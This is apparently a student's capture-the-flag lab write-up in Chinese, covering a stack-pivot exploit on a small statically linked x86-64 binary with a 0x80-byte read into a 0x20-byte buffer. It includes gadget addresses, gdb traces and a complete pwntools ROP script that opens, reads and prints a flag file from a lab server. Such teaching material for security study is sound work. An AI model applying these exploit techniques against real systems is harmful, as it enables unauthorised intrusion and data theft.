---
title: Simple PWN 0x35(2023 Lab - Stack Pivot)
tags: [eductf, CTF, PWN]

category: "Security｜Course｜NTU CS｜PWN"
date: 2024-01-31
---

# Simple PWN 0x35(2023 Lab - Stack Pivot)
<!-- more -->

## Background
[Simple PWN - 0x09(stack pivoting)](https://hackmd.io/@SBK6401/rylybxgji)
[Simple PWN - 0x10(seccomp/Lab - rop2win)](https://hackmd.io/@SBK6401/H1NX6Bloj)

## Source code
```cpp
#include <stdio.h>
#include <unistd.h>

int main(void)
{
	char buf[0x20];
	read(0, buf, 0x80);
	return 0;
}
```

## Recon
這一題助教是預設我們必須要使用stack pivot的技巧拿到flag，不過沒有時間設定seccomp，所以我們自己假裝只能使用read / write / open這三個syscall
1. checksec + file
    ```bash
    $ checksec chal
    [*] '/mnt/d/NTU/Second Year/Computer Security/PWN/Lab2/lab_stack_pivot/share/chal'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
    $ file chal
    chal: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=26fa8e6daa97baf7a26596ea91af5703dd932327, for GNU/Linux 3.2.0, not stripped
    ```
    首先可以看到該binary是statically link，所以直覺是利用ROP chain拿到shell，不過仔細看source code會發現BOF的長度顯然不太夠我們蓋成shell，所以需要用到stack pivot的技巧，控制RBP跳到其他的地方繼續寫
2. 找gadget
    ```python
    leave_ret = 0x0000000000401cfc
    pop_rdi_ret = 0x0000000000401832
    pop_rsi_ret = 0x000000000040f01e
    pop_rax_ret = 0x0000000000448d27
    pop_rdx_ret = 0x000000000040173f
    syscall_ret = 0x0000000000448280
    ```
    這邊的重點是syscall ret這個gadget，其實他不是syscall完之後直接ret，而是在經過一些判斷才會進到ret，這個可以從gdb看出來
    ```bash
    gef➤  x/10i 0x448280
       0x448280 <read+16>:  syscall
    => 0x448282 <read+18>:  cmp    rax,0xfffffffffffff000
       0x448288 <read+24>:  ja     0x4482e0 <read+112>
       0x44828a <read+26>:  ret
    ```
    會這樣的原因是我們在ROPgadget中找不到`syscall ; ret`的gadget，所以助教提示可以直接從read / write這種function找，這樣syscall完了之後會很快的接到ret，這樣中間的操作才不會太影響我們蓋的rop
3. Construct ROP
    首先，我們的流程是
    ==main_fn → bss_open → main_fn → bss_open → main_fn → bss_write==
    會這樣的原因是我們只能寫入0x60的空間而已，所以把open / read / write分開寫，而寫完且執行完後會再跳原main_fn，這樣才能讓我們再讀取下一段的ROP payload
    1. 寫入的bss_addr和main_fn address
        ```python
        bss_addr_open = 0x4c2700
        bss_addr_read = 0x4c2800
        bss_addr_write = 0x4c2900
        main_fn = 0x401ce1
        ```
    1. 先讓rbp跳到bss_open，然後ret到main_fn，接要放到bss_open的payload
        ```python
        trash_payload = b'a'*0x20
        r.sendline(trash_payload + p64(bss_addr_open) + p64(main_fn))
        ```
        之前的rop chain我們會把RBP一起蓋掉，但現在因為要跳到其他的地方，所以rbp的部分就跳到`0x4c2700`，然後ret address接main_fn
        用gdb跟一下，放完的結果大概是這樣
        ```bash
        0x00007ffc884f3670│+0x0000: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"   ← $rsp, $rsi
        0x00007ffc884f3678│+0x0008: "aaaaaaaaaaaaaaaaaaaaaaaa"
        0x00007ffc884f3680│+0x0010: "aaaaaaaaaaaaaaaa"
        0x00007ffc884f3688│+0x0018: "aaaaaaaa"
        0x00007ffc884f3690│+0x0020: 0x00000000004c2700  →  <transmem_list+0> add BYTE PTR [rax], al      ← $rbp
        0x00007ffc884f3698│+0x0028: 0x0000000000401ce1  →  <main+12> lea rax, [rbp-0x20]
        ```
        當main_fn執行完leave(`mov rsp , rbp ; pop rbp ;`)的時候，rbp就會指到==0x4c2700==，當我們ret到main_fn時，就可以再次輸入payload放到0x4c2700
    2. 觀察main_fn的assembly
        ```bash
        gef➤  x/10i &main
           0x401cd5 <main>:     endbr64
           0x401cd9 <main+4>:   push   rbp
           0x401cda <main+5>:   mov    rbp,rsp
           0x401cdd <main+8>:   sub    rsp,0x20
           0x401ce1 <main+12>:  lea    rax,[rbp-0x20]
           0x401ce5 <main+16>:  mov    edx,0x80
           0x401cea <main+21>:  mov    rsi,rax
           0x401ced <main+24>:  mov    edi,0x0
           0x401cf2 <main+29>:  call   0x448270 <read>
           0x401cf7 <main+34>:  mov    eax,0x0
        ```
        從以上的code可以看得出來，我們是跳到0x401ce1，所以rbp會張出0x20的空間，也就是==0x4c2700-0x20=0x4c26e0==，然後read到的內容就會放到這邊來
    3. 寫入bss_addr_open
        我們的目標是達成==fd = open("/home/chal/flag.txt", 0);==，具體payload如下
        ```python
        file_addr = b'/home/chal/flag.txt'.ljust(0x20, b'\x00')
        ROP_open = flat(
            # Open file
            # fd = open("/home/chal/flag.txt", 0);
            bss_addr_read,
            pop_rax_ret,    2,
            pop_rdi_ret,    bss_addr_open - 0x20,
            pop_rsi_ret,    0,
            pop_rdx_ret,    0,
            syscall_ret,
            main_fn
        )
        r.sendline(file_addr + ROP_open)
        ```
        首先原本的0x20就拿來放檔案的位址，不過為甚麼後面還要再接著bss_addr_write呢?就和上面一樣，我們要寫別的rop payload上去，因為原本的位子不夠寫了，所以syscall_ret後接到main_fn，他會讀取我們寫入的rop payload到bss_addr_read的地方
    4. 寫入bss_addr_read
        我們要達成的目標是==read(fd, buf, 0x30)==，具體payload如下
        ```python
        ROP_read = flat(
            # Read the file
            # read(fd, buf, 0x30);
            bss_addr_write,
            pop_rax_ret, 0,
            pop_rdi_ret, 3, 
            pop_rsi_ret, bss_addr_read,
            pop_rdx_ret, 0x30,
            syscall_ret,
            main_fn
        )
        r.sendline(file_addr + ROP_read)
        ```
    5. 寫入bss_addr_write
        我們要達成的目標是==write(fd, buf, 0x30)==，具體payload如下
        ```python
        ROP_write = flat(
            # Write the file
            # write(1, buf, 0x30);
            bss_addr_write,
            pop_rax_ret, 1,
            pop_rdi_ret, 1,
            pop_rsi_ret, bss_addr_read,
            pop_rdx_ret, 0x30,
            syscall_ret,
            0
        )
        r.sendline(file_addr + ROP_write)
        ```

:::danger
執行的時候如果遇到local端可以run但server爛掉的情況，有可能是raw_input()造成的，可以先註解掉這些東西，如果還是遇到一樣的問題，可以開docker在裡面執行
```bash
$ docker-compose up -d
$ docker ps
$ docker exec -it {container name} /bin/bash
> apt update; apt upgrade -y; apt install curl binutils vim git gdb python3 python3-pip -y
> pip install pwntools -y
> python3 exp.py
```
:::

## Exploit - ROPchain + stack pivot
```python
from pwn import *

context.arch = 'amd64'

# r = process('./chal')
r = remote('10.113.184.121', 10054)

leave_ret = 0x0000000000401cfc
pop_rdi_ret = 0x0000000000401832
pop_rsi_ret = 0x000000000040f01e
pop_rax_ret = 0x0000000000448d27
pop_rdx_ret = 0x000000000040173f
syscall_ret = 0x0000000000448280

bss_addr_open = 0x4c2700
bss_addr_read = 0x4c2800
bss_addr_write = 0x4c2900
main_fn = 0x401ce1

# raw_input()
# Modify RBP to a new Stack Space
trash_payload = b'a'*0x20
r.sendline(trash_payload + p64(bss_addr_open) + p64(main_fn))


# Open /home/chal/flag.txt
file_addr = b'/home/chal/flag.txt'.ljust(0x20, b'\x00')
ROP_open = flat(
    # Open file
    # fd = open("/home/chal/flag.txt", 0);
    bss_addr_read,
    pop_rax_ret,    2,
    pop_rdi_ret,    bss_addr_open - 0x20,
    pop_rsi_ret,    0,
    pop_rdx_ret,    0,
    syscall_ret,
    main_fn
)
# raw_input()
r.sendline(file_addr + ROP_open)

# Read flag.txt
ROP_read = flat(
    # Read the file
    # read(fd, buf, 0x30);
    bss_addr_write,
    pop_rax_ret, 0,
    pop_rdi_ret, 3, 
    pop_rsi_ret, bss_addr_read,
    pop_rdx_ret, 0x30,
    syscall_ret,
    main_fn
)
# raw_input()
r.sendline(file_addr + ROP_read)

# Write flat.txt to stdout
ROP_write = flat(
    # Write the file
    # write(1, buf, 0x30);
    bss_addr_write,
    pop_rax_ret, 1,
    pop_rdi_ret, 1,
    pop_rsi_ret, bss_addr_read,
    pop_rdx_ret, 0x30,
    syscall_ret,
    0
)
# raw_input()
r.sendline(file_addr + ROP_write)

r.interactive()
```